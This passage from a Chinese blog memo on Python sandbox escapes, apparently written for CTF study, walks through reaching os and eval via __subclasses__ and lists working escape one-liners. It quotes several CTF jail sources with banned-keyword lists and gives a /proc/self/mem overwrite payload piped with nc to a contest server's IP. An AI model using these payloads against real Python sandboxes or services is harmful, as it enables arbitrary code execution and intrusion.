+<p>3）我们从根类object向下回溯，使用 <code>__subclasses__</code></p>
+<pre><code class="hljs">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2]
+&lt;type &#39;object&#39;&gt;
+
+&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__
+&lt;built-in method __subclasses__ of type object at 0x8f8740&gt;
+
+&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()
+[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;]
+</code></pre>
+<p>哇，这也太多了吧，我怎么知道我该选哪个？？<br>别怕，我python本就是用来写脚本的，写一个循环遍历一下岂不是简简单单？？</p>
+<p>我这里就直接把bendawang 师傅文章中的代码拿过来</p>
+<pre><code class="hljs">#!/usr/bin/env python
+# encoding: utf-8
+
+cnt=0
+for item in [].__class__.__base__.__subclasses__():
+    try:
+        if &#39;os&#39; in item.__init__.__globals__:
+            print cnt,item
+        cnt+=1
+    except:
+        print &quot;error&quot;,cnt,item
+        cnt+=1
+        continue
+</code></pre>
+<p>这段代码的目的就是找到调用 os 模块的入口，当然我们只要把os 替换成sys 等其他模块也能得到对应的结果。</p>
+<pre><code class="hljs">#!/usr/bin/env python
+# encoding: utf-8
+
+cnt=0
+for item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():
+    try:
+        cnt2=0
+        for i in item.__init__.__globals__:
+            if &#39;eval&#39; in item.__init__.__globals__[i]:
+                print cnt,item,cnt2,i
+            cnt2+=1
+        cnt+=1
+    except:
+        print &quot;error&quot;,cnt,item
+        cnt+=1
+        continue
+</code></pre>
+<p>这第二个脚本相当于就是跑了两层</p>
+<p>这两个脚本的思路非常的好，赶紧搬过来收藏一下，以后作为参考hhh</p>
+<p><strong>4）简单的整理一下前辈们已经fuzz出来的一些结果：</strong></p>
+<pre><code class="hljs">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)
+
+[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)
+
+&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)
+
+&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)
+
+&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()
+
+&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&quot;ls&quot;)&#39;)
+
+&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)[&#39;linecache&#39;].__dict__[&#39;sys&#39;].modules[&#39;os&#39;].popen(&#39;ls&#39;).read()
+</code></pre>
+<h2 id="六、内存破坏突破python沙盒"><a href="#六、内存破坏突破python沙盒" class="headerlink" title="六、内存破坏突破python沙盒"></a>六、内存破坏突破python沙盒</h2><p>这个方法来源于 Plaid CTF 2014年的一道题<code>__nightmares__</code><br>这道题的出题思路并不是web的单纯的绕过，而是涉及到了内存的破坏与利用<br>附上题目代码：</p>
+<pre><code class="hljs">#!/usr/bin/python -u
+&#39;&#39;&#39;
+You may wish to refer to solutions to the pCTF 2013 &quot;pyjail&quot; problem if
+you choose to attempt this problem, BUT IT WON&#39;T HELP HAHAHA.
+&#39;&#39;&#39;
+
+from imp import acquire_lock
+from threading import Thread
+from sys import modules, stdin, stdout
+
+# No more importing!
+x = Thread(target = acquire_lock, args = ())
+x.start()
+x.join()
+del x
+del acquire_lock
+del Thread
+
+# No more modules!
+for k, v in modules.iteritems():
+    if v == None: continue
+    if k == &#39;__main__&#39;: continue
+    v.__dict__.clear()
+
+del k, v
+
+__main__ = modules[&#39;__main__&#39;]
+modules.clear()
+del modules
+
+# No more anything!
+del __builtins__, __doc__, __file__, __name__, __package__
+
+print &gt;&gt; stdout, &quot;Get a shell. The flag is NOT in ./key, ./flag, etc.&quot;
+while 1:
+    exec &#39;print &gt;&gt; stdout, &#39; + stdin.readline() in &#123;&#39;stdout&#39;:stdout&#125;
+</code></pre>
+<p>WP address :<a target="_blank" rel="noopener" href="https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/">https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/</a></p>
+<h2 id="七、一些简单的python-沙盒"><a href="#七、一些简单的python-沙盒" class="headerlink" title="七、一些简单的python 沙盒"></a>七、一些简单的python 沙盒</h2><p>下面列出一些python 的沙盒代码，给学习的人一些参考</p>
+<h3 id="题目一、"><a href="#题目一、" class="headerlink" title="题目一、"></a>题目一、</h3><pre><code class="hljs">  ____                  
+ |  _ \ _   _ _ __      
+ | |_) | | | | &#39;_ \     
+ |  _ &lt;| |_| | | | |    
+ |_| \_\__,_|_| |_|    
+                        
+
+Escape from the dark house built with python :)
+
+Try to getshell then find the flag!
+
+
+&gt;&gt;&gt;#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Date    : 2018-04-09 23:30:58
+# @Author  : Xu (you@example.org)
+# @Link    : https://xuccc.github.io/
+# @Version : $Id$
+
+from sys import modules
+from cpython import get_dict
+from types import FunctionType
+
+main  = modules[&#39;__main__&#39;].__dict__
+origin_builtins = main[&#39;__builtins__&#39;].__dict__
+
+def delete_type():
+    type_dict = get_dict(type)
+    del type_dict[&#39;__bases__&#39;]
+    del type_dict[&#39;__subclasses__&#39;]
+
+def delete_func_code():
+    func_dict = get_dict(FunctionType)
+    del func_dict[&#39;func_code&#39;]
+
+def safe_import(__import__,whiteList):
+    def importer(name,globals=&#123;&#125;,locals=&#123;&#125;,fromlist=[],level=-1):
+        if name in whiteList:
+            return __import__(name,globals,locals,fromlist,level)
+        else:
+            print &quot;HAHA,[%s]  has been banned~&quot; % name
+    return importer
+
+class ReadOnly(dict):
+    &quot;&quot;&quot;docstring for ReadOnlu&quot;&quot;&quot;
+    def __delitem__(self,keys):
+        raise ValueError(&quot;:(&quot;)        
+    def pop(self,key,default=None):
+        raise ValueError(&quot;:(&quot;)        
+    def popitem(self):
+        raise ValueError(&quot;:(&quot;)        
+    def setdefault(self,key,value):
+        raise ValueError(&quot;:(&quot;)        
+    def __setitem__(self,key,value):
+        raise ValueError(&quot;:(&quot;)        
+    def __setattr__(self, name, value):
+        raise ValueError(&quot;:(&quot;)
+    def update(self,dict,**kwargs):
+        raise ValueError(&quot;:(&quot;)        
+
+def builtins_clear():
+    whiteList = &quot;raw_input  SyntaxError   ValueError  NameError  Exception __import__&quot;.split(&quot; &quot;)
+    for mod in __builtins__.__dict__.keys():
+        if mod not in whiteList:
+            del __builtins__.__dict__[mod]
+
+def input_filter(string):
+    ban = &quot;exec eval pickle os subprocess input sys ls cat&quot;.split(&quot; &quot;)
+    for i in ban:
+        if i in string.lower():
+            print &quot;&#123;&#125; has been banned!&quot;.format(i)
+            return &quot;&quot;
+    return string
+
+# delete_type();
+del delete_type
+delete_func_code();del delete_func_code
+builtins_clear();del builtins_clear
+
+
+whiteMod = []
+origin_builtins[&#39;__import__&#39;] = safe_import(__import__,whiteMod)
+safe_builtins = ReadOnly(origin_builtins);del ReadOnly
+main[&#39;__builtins__&#39;] = safe_builtins;del safe_builtins
+
+del get_dict,modules,origin_builtins,safe_import,whiteMod,main,FunctionType
+del __builtins__, __doc__, __file__, __name__, __package__
+
+print &quot;&quot;&quot;
+  ____                  
+ |  _ \ _   _ _ __      
+ | |_) | | | | &#39;_ \     
+ |  _ &lt;| |_| | | | |    
+ |_| \_\\__,_|_| |_|    
+                        
+
+Escape from the dark house built with python :)
+
+Try to getshell then find the flag!
+
+&quot;&quot;&quot;
+
+while 1:
+    inp = raw_input(&#39;&gt;&gt;&gt;&#39;)
+    cmd = input_filter(inp)
+    try:
+        exec cmd 
+    except NameError, e:
+        print &quot;wow something lose!We can\&#39;t find it !  D:&quot;
+    except SyntaxError,e:
+        print &quot;Noob! Synax Wrong! :(&quot;
+    except Exception,e:
+        print &quot;unknow error,try again  :&gt;&quot;
+
+&gt;&gt;&gt;Traceback (most recent call last):
+  File &quot;/home/ctf/sandbox.py&quot;, line 92, in &lt;module&gt;
+    inp = raw_input(&#39;&gt;&gt;&gt;&#39;)
+EOFError: EOF when reading a line
+</code></pre>
+<p>补充：这道题就是最近的异常比赛的题目源码，我做题 下载了下来，出题者本来的意图应该就是让我们使用内存攻击的pwn 的手法，但是还是被我们web选手饶了过去<br>下面给出pwn的一种解法：</p>
+<pre><code class="hljs"># look up the addresses
+objdump -R python.out | grep -E &#39;fopen|system&#39; 
+
+# copy 8 bytes from the system address to the fopen64 address, and get flag
+echo &quot;(lambda r, w: r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40](&#39;grep ciscn -r /home/ctf/&#39;)) (().__class__.__bases__[0].__subclasses__()[40](&#39;/proc/self/mem&#39;,&#39;r&#39;), ().__class__.__bases__[0].__subclasses__()[40](&#39;/proc/self/mem&#39;,&#39;w&#39;,0))&quot; | nc 117.78.43.163 31836
+</code></pre>
+<p>接下来是web解（来源于梅子酒师傅）</p>
+<pre><code class="hljs">s = &quot;func_global&quot;+&quot;s&quot;
+d = &quot;sy&quot;+&quot;s&quot;
+b = &quot;o&quot;+&quot;s&quot;
+c = &quot;l&quot;+&quot;s&quot;
+
+print(&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(s)[&#39;linecache&#39;].__dict__[d].modules[b].popen(c).read())
+</code></pre>
+<h3 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h3><pre><code class="hljs">#!/usr/bin/env python
+from future import print_function
+
+print(&quot;Welcome to my Python sandbox! Enter commands below!&quot;)
+
+banned = [ 
+    &quot;import&quot;,
+    &quot;exec&quot;,
+    &quot;eval&quot;,
+    &quot;pickle&quot;,
+    &quot;os&quot;,
+    &quot;subprocess&quot;,
+    &quot;kevin sucks&quot;,
+    &quot;input&quot;,
+    &quot;banned&quot;,
+    &quot;cry sum more&quot;,
+    &quot;sys&quot;
+]
+
+targets = builtins.dict.keys() 
+targets.remove(&#39;raw_input&#39;) 
+targets.remove(&#39;print&#39;) 
+for x in targets: 
+    del builtins.dict[x]
+
+while 1: 
+    print(&quot;&gt;&gt;&gt;&quot;, end=&#39; &#39;)
+    data = raw_input()
+
+    for no in banned:
+        if no.lower() in data.lower():
+            print(&quot;No bueno&quot;)
+            break
+    else: # this means nobreak
+        exec data
+</code></pre>
+<h3 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h3><pre><code class="hljs">#!/usr/bin/env python
+from re import findall
+def make_secure():
+    UNSAFE = [&#39;open&#39;,
+              &#39;file&#39;,
+              &#39;execfile&#39;,
+              &#39;compile&#39;,
+              &#39;reload&#39;,
+              &#39;__import__&#39;,
+              &#39;eval&#39;,
+              &#39;input&#39;]
+    for func in UNSAFE:
+        del __builtins__.__dict__[func]
+
+# Remove dangerous builtins
+make_secure()
+print &#39;Go Ahead, Expoit me &gt;;D&#39;
+while True:
+    try:
+        # Read user input until the first whitespace character
+        inp = findall(&#39;\S+&#39;, raw_input())[0]
+        a = None
+        # Set a to the result from executing the user input
+        exec &#39;a=&#39; + inp
+        print &#39;Return Value:&#39;, a
+    except Exception, e:
+    print &#39;Exception:&#39;, e
+</code></pre>
+<p>参考链接：<br><a target="_blank" rel="noopener" href="http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.0aa.me/index.php/archives/123/">http://www.0aa.me/index.php/archives/123/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/52">https://xz.aliyun.com/t/52</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/">https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35078631/article/details/78504415">https://blog.csdn.net/qq_35078631/article/details/78504415</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/web%E5%AE%89%E5%85%A8/" class="category-chain-item">web安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8-Python/" class="print-no-link">#网络安全 沙盒逃逸 Python</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Python 沙盒逃逸备忘</div>
+      <div>http://example.com/2018/05/04/Python 沙盒逃逸备忘/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>May 4, 2018</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/05/17/%E6%90%AD%E5%BB%BAdocker%E7%9A%84%20CTF%20getshell%E7%8E%AF%E5%A2%83/" title="搭建docker的 CTF getshell环境">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">搭建docker的 CTF getshell环境</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/05/04/Python%20%E7%9A%84%20type%E4%B8%8Eclass%20%E4%B9%8B%E4%BA%89/" title="Python 的 type与class 之争">
+                        <span class="hidden-mobile">Python 的 type与class 之争</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
